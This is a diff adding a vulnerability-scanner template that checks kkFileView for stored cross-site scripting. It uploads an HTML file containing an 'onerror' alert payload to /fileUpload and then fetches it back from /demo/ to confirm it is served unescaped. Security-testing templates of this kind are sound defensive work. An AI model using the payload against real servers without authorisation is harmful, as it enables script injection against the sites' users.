@@ -1,0 +1,21 @@
+id: kkfileview-upload-xss
+
+set:
+  randname: randomLowercase(6)
+  rboundary: randomLowercase(8)
+rules:
+    - method: POST
+      path: /fileUpload
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{randname}}.html\"\r\nContent-Type: text/html\r\n\r\n<img src=z onerror=alert(document.domain)>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+      expression: response.status == 200 && response.body.bcontains(b'"code":0') && response.body.bcontains(b'"msg":"SUCCESS"')
+
+    - method: GET
+      path: /demo/{{randname}}.html
+      expression: response.status == 200 && response.body.bcontains(b"<img src=z onerror=alert(document.domain)>")
+severity:
+  critical
+type: 
+  xss
+
